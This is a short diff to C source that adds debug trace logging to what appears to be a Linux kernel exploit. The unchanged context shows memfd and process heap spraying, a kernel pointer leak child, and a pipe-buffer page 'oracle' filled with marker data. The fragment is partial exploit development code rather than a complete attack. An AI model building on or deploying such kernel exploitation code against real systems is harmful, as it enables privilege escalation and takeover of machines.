@@ -126,13 +126,18 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     spray.memfds[i] = clone_memfd();
   }
 
+  app_trace("prep_child: setup_kernelsnitch begin");
   setup_kernelsnitch();
+  app_trace("prep_child: setup_kernelsnitch done");
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     pre.childs[i] = -1;
     pre.memfds[i] = clone_memfd();
   }
+  app_trace("prep_child: pre=%zu post=%zu spray=%zu prep=%zu clone leak",
+            pre.mm_cnt, post.mm_cnt, spray.mm_cnt, prep.mm_cnt);
   pid_t leak_child = clone_leak_child();
+  app_trace("prep_child: leak_child=%d", (int)leak_child);
   for (size_t i = 0; i < post.mm_cnt; i++) {
     post.childs[i] = -1;
     post.memfds[i] = clone_memfd();
@@ -256,6 +261,7 @@ uintptr_t prepare_pipe_buffer_page(void) {
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
     make_pipe_object(pipe_fds_reclaim[i]);
   }
+  app_trace("oracle: pipe objects made drain=%d reclaim=%d", PIPE_DRAIN, PIPE_RECLAIM);
   pipe_objects_ready = 1;
 
   int result_pipe[2];
@@ -1043,11 +1049,15 @@ int prepare_p0_pipe_oracle(void) {
   }
   p0_gate_holders_initialized = 1;
 
+  app_trace("oracle: enter prepare_pipe_buffer_page");
   pipebuf_page_base = prepare_pipe_buffer_page();
+  app_trace("oracle: prepare_pipe_buffer_page -> %016zx", (size_t)pipebuf_page_base);
   if (!is_direct_ptr(pipebuf_page_base)) {
     return 0;
   }
 
+  app_trace("oracle: page ready base=%016zx drain=%d reclaim=%d",
+            (size_t)pipebuf_page_base, PIPE_DRAIN, PIPE_RECLAIM);
   unsigned char marker[PAGE_SIZE];
   memset(marker, 0x5a, sizeof(marker));
   memcpy(marker, "RMG-P0-PIPE", 11);
@@ -1057,6 +1067,7 @@ int prepare_p0_pipe_oracle(void) {
       return 0;
     }
   }
+  app_trace("oracle: markers filled all %d pipes", PIPE_RECLAIM);
   pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
           pipebuf_page_base, PIPE_RECLAIM);
   return 1;
